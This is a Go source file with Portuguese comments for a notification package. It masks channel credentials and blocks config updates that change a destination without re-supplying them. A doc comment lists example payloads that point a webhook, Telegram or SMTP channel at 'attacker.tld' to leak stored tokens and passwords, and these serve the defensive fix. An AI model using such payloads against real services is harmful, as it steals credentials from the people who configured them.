package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix é o prefixo marcador de um valor mascarado. Ao devolver credenciais, a API substitui o conteúdo real por um valor com este prefixo,
// e a interface de atualização, ao receber um valor com este prefixo, entende como "manter inalterado o valor original do banco".
//
// Usa-se um prefixo, e não string vazia ou uma constante fixa, para poder levar junto alguma informação identificável
// (veja MaskedValue), permitindo ao usuário distinguir "qual é este robô" sem precisar colar a chave de novo.
const MaskedPrefix = "__masked__"

// MaskedValue gera um valor mascarado:
//
//	"__masked__"              valor original curto demais, não dá nenhuma dica
//	"__masked__:…ab12cd"      inclui os 6 últimos caracteres do valor original como dica de identificação
//
// Expor apenas os 6 últimos é uma escolha deliberada: a informação identificável de um endereço de Webhook está no trecho final (como a key do WeCom
// e o id do robô do Feishu), enquanto a parte do prefixo é igual em todos os robôs e não tem valor de identificação. Os 6 últimos não bastam para
// reconstituir a credencial, mas bastam para quem configura reconhecer "este é o meu grupo".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked informa se um valor é um valor mascarado (ou seja, devolvido pela interface e não modificado).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig retorna uma cópia da configuração, substituindo os campos de credencial do canal por valores mascarados.
//
// Tipo de canal desconhecido retorna um map vazio em vez da configuração original — é melhor a UI mostrar "configuração indisponível"
// do que devolver por inteiro um conteúdo original que possivelmente contém credenciais quando o tipo de canal não é reconhecido.
// Campos que não são credenciais são mantidos como estão, para a UI poder exibi-los normalmente.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Estruturas aninhadas como headers são tratadas por inteiro como uma única credencial: julgar subchave por subchave exigiria que cada canal
		// declarasse mais um conjunto de regras sobre "quais subchaves são credenciais", e a complexidade excede em muito o benefício.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indica que "o endereço de destino mudou, mas quem chamou não se manifestou
// sobre os campos de credencial". Retorna-se este erro em vez de aprovar em silêncio ou descartar a credencial em silêncio; o motivo está em PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // chaves de destino que mudaram
	Missing []string // chaves de credencial sobre as quais não houve manifestação explícita
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "O endereço de destino (" + strings.Join(e.Changed, ", ") + ") foi alterado; preencha novamente também os campos de credencial (" +
		strings.Join(e.Missing, ", ") + "): informe o novo valor ou deixe vazio explicitamente para indicar que a credencial não é mais necessária. " +
		"A credencial original só vale para o endereço antigo; mantê-la equivale a entregá-la ao novo endereço."
}

// PrepareConfigUpdate mescla a configuração do canal e trata o caso sensível à segurança "alteração do endereço de destino".
//
// Ele substitui o MergeConfig puro no caminho de atualização de canais, resolvendo um caminho comprovadamente viável:
// o endereço de destino (para onde a mensagem vai) e a credencial (com qual identidade se envia) são dois conjuntos independentes de campos, e o MergeConfig
// mantém o valor original do banco para qualquer "chave não mencionada". Assim, qualquer pessoa que consiga fazer PATCH no canal, bastando **alterar só o endereço
// e não dizer nada sobre a credencial**, faz o servidor enviar a credencial real do banco a um endpoint sob seu controle:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → o cabeçalho Authorization original sai junto com a requisição
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<Token real>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → após o STARTTLS, entrega usuário e senha
//
// Esse caminho é totalmente silencioso, não depende de redirecionamento (portanto recusar saltos entre hosts não o impede),
// e fura diretamente o objetivo do mecanismo de máscara deste pacote — "a credencial não é ecoada para o navegador".
//
// Regra: assim que uma chave de destino é alterada para um novo valor, quem chama deve se manifestar explicitamente sobre **cada** chave de credencial:
//   - informar um novo valor → usa o novo valor
//   - enviar explicitamente string vazia → o campo não precisa mais de credencial (mantém a semântica de limpar)
//   - devolver o valor mascarado como está / simplesmente não mencionar a chave → recusa
//
// A terceira também é recusada porque o significado do "valor mascarado" é justamente "manter a credencial antiga", e a credencial antiga
// só vale para o endereço antigo. Deliberadamente não se faz "descartar a credencial automaticamente" — isso, para campos de credencial opcionais
// (headers do webhook, password do e-mail), viraria em silêncio "a autenticação sumiu mas a interface retorna 200",
// o que é mais difícil de investigar do que um erro. É melhor fazer o operador preencher uma vez a mais.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("tipo de canal %q não registrado", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// Valores de credencial que não são string (como headers do webhook, que é um objeto) que contenham o literal de máscara embutido
	// indicam que quem chamou enfiou a sentinela de "manter o valor original" dentro da estrutura. O MergeConfig só reconhece como máscara "uma string
	// com o prefixo", e essa forma seria armazenada como um objeto comum — o banco gravaria de verdade o literal
	// "__masked__", e a autenticação posterior falharia em silêncio, sem nenhum erro. É melhor recusar.
	//
	// Esta verificação deve ficar **logo no início**: quando o endereço não mudou, há retorno antecipado, e colocá-la depois equivaleria a
	// cobrir apenas o caminho "alterar endereço" (a primeira versão errou colocando-a assim, e o teste pegou direto).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Encontra as chaves de destino que de fato foram alteradas. Valor mascarado equivale a "não alterado".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// O endereço não mudou, segue a mesclagem normal (valor mascarado mantém o original, string vazia limpa, o restante sobrescreve).
		return MergeConfig(stored, incoming), nil
	}

	// O endereço mudou: exige-se manifestação explícita sobre cada chave de credencial.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers recusa o envio com a sentinela de máscara embutida em estruturas que não são string.
//
// A premissa do mecanismo de máscara é que "o valor inteiro é uma string". Para campos objeto como headers do webhook,
// só se pode mascarar por inteiro (escrevendo a string "__masked__") ou enviar por inteiro; enfiar a sentinela dentro do objeto
// não consegue expressar "manter inalterado" e ainda seria armazenada no banco como valor real.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("o conteúdo do campo %s contém o marcador de máscara %q: este campo só pode ser deixado vazio por inteiro para manter o valor, ou enviado por inteiro com um novo valor; não é permitido embutir o placeholder de máscara dentro da estrutura",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compara se dois valores de configuração são equivalentes. A comparação por serialização JSON serve para tratar de passagem
// as diferenças de tipo — a porta enviada pelo front-end é number, e a lida de volta do banco é float64, e um == direto julgaria errado.
//
// O "vazio" precisa ser normalizado antes da comparação: string vazia e "chave inexistente" são o mesmo estado neste modelo de configuração,
// porque o MergeConfig trata string vazia como limpeza explícita e dá delete na chave. Sem normalizar, um campo de destino opcional
// sempre deixado vazio (o base_url do Telegram é o único campo assim: vazio significa usar o endereço oficial)
// cairia neste caminho —
//
//	na criação grava base_url:""  →  no primeiro salvamento o MergeConfig apaga a chave
//	→ no segundo salvamento incoming é "" e stored não tem a chave, e é julgado como "o endereço mudou"
//	→ a credencial é um valor mascarado → 400 "O endereço de destino foi alterado; preencha novamente também os campos de credencial"
//
// A partir daí todo salvamento falha, a menos que o usuário cole de novo o Bot Token, sem ter alterado nada.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue julga se um valor de configuração é "vazio".
// O critério deve coincidir com o da limpeza do MergeConfig (strings.TrimSpace(s) == ""),
// senão surge uma brecha em que "o MergeConfig acha que deve apagar e o sameConfigValue acha que há valor".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig mescla incoming sobre stored, usado para atualizar a configuração do canal.
//
// Regras:
//   - chave de incoming cujo valor é máscara → mantém o valor original de stored (o usuário não alterou este campo)
//   - chave de incoming com valor string vazia → tratada como limpeza explícita, e a chave é apagada
//   - demais chaves → sobrescreve com o valor de incoming
//   - chave presente em stored e ausente em incoming → mantida (semântica de atualização parcial)
//
// É preciso deixar claro se string vazia conta como "limpar": o formulário do front-end envia campos não preenchidos como string vazia,
// e tratá-la como valor válido gravaria e apagaria de fato os campos do tipo "deixe vazio para manter o valor original".
// Aqui se escolhe a limpeza explícita, porque para remover um campo configurado errado o usuário não tem outra forma de expressar isso
// (remover o campo permitiria distinguir "não fornecido" de "fornecido vazio", mas a UI não usa essa distinção).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // valor mascarado = não modificado, mantém o stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
